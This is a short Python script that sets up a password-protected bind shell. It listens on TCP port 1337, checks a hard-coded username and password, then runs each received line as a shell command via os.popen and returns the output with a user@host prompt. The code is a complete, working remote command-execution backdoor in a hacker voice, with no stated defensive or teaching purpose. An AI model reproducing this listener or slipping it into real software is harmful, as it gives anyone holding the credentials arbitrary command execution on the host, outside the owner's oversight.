import os
import socket

# Setup host and port for binding
host = '127.0.0.1'
port = 1337 # cause we are leet

# Setup the socket to tcp and local
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind and listen
s.bind((host,port))
s.listen()

# Setup our user and password data
username = 'd151nt3gr4t0r'
password = '1337h4ck3r'


while True:
	# Accept Connections
	conn, addr = s.accept()
	print(f"Received connection by: {addr}")

	loggedin = False

	while(True):
		# Give Shell for logged in users
		if loggedin:
			response = os.popen(data.decode()).read()
			conn.sendall(bytes(response + '\n', 'utf-8'))
			conn.sendall(bytes(os.popen("whoami").read().strip() + "@" + os.popen("hostname").read().strip() + "$ ", 'utf-8'))
		else:
			# Require login
			conn.sendall(b"Please log in to use the service!\n")
			conn.sendall(b"Username: ")
			user = conn.recv(1024)
			conn.sendall(b"Password: ")
			passw = conn.recv(1024)
			if user.decode().strip() == username and passw.decode().strip() == password:
				loggedin = True
				conn.sendall(b"Authentication Successful\n")
			else:
				conn.sendall(b"Skiddies keep out!\n")
		data = conn.recv(1024)
		if not data:
			break
